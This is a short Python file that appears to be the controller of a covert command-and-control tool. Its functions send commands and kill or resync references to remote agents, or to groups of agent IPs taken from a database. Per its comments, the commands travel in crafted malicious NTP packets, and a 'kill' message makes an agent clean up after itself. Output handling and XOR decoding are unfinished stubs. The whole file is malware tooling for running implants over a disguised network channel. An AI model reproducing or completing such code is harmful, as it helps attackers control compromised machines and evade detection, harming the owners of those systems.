from transport import packets
from termcolor import colored

def sendRefCMD(tsObj, destGroup, endpoint, refId):
    #send manual ping, expect resync back from agent
    #send refid kill, agent will clean up, status dead in db
    if destGroup == "agent":
        print(colored(f" Sending Reference \"{refId}\" ==> ({endpoint})\n", "magenta"))

        iPacket = packets.IDPacket(endpoint, refId)
        iPacket.sendIdPacket()

    else:
        data = tsObj.getDBObj().pullSpecific(destGroup, endpoint)
        for ip in data:
            print(colored(f" Sending Reference \"{refId}\" ==> {ip[0]} ({endpoint})\n", "magenta"))

            iPacket = packets.IDPacket(ip[0], refId)
            iPacket.sendIdPacket()


#send command via NTP message, craft mal packet
def sendCMD(tsObj, cmd, destGroup, endpoint): 
    if destGroup == "agent": 
        print(colored(f" Sending Command \"{cmd}\" ==> ({endpoint})\n", "magenta"))
        cPacket = packets.CommandPacket(endpoint, cmd)
        cPacket.sendCommandPacket()

    else:
        data = tsObj.getDBObj().pullSpecific(destGroup, endpoint)
        for ip in data:
            print(colored(f" Sending Command \"{cmd}\" ==> {ip[0]} ({endpoint})\n", "magenta"))

            cPacket = packets.CommandPacket(ip[0], cmd)
            cPacket.sendCommandPacket()


def printOutput(datahold, ip):
    print("output", datahold, ip) #TODO actual output


def decode(data):
    #TODO xor single byte decode, return data
    strdata = data.decode('latin-1')

    return strdata